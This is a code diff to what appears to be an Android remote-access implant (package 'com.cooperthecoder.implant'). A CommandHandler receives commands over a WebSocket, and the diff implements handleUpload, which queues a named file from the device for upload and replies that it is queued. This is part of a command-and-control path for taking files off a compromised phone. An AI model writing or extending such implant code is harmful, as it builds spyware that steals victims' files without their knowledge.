@@ -1,9 +1,12 @@
 package com.cooperthecoder.implant.command
 
+import android.os.Environment
 import android.util.Log
+import com.cooperthecoder.implant.data.UploadQueue
 import com.cooperthecoder.implant.model.Command
 import okhttp3.WebSocket
 import java.io.BufferedReader
+import java.io.File
 import java.io.InputStreamReader
 
 class CommandHandler(val command: Command, val socket: WebSocket) {
@@ -61,7 +64,14 @@ class CommandHandler(val command: Command, val socket: WebSocket) {
     }
 
     private fun handleUpload(filename: String) {
+        try {
+            UploadQueue.push(filename)
+        } catch (e: Exception) {
+            reply("", "Error: ${e.message}")
+            return
+        }
 
+        reply("$filename queued for upload.", "")
     }
 
     private fun handleReply(nonce: String, output: String) {
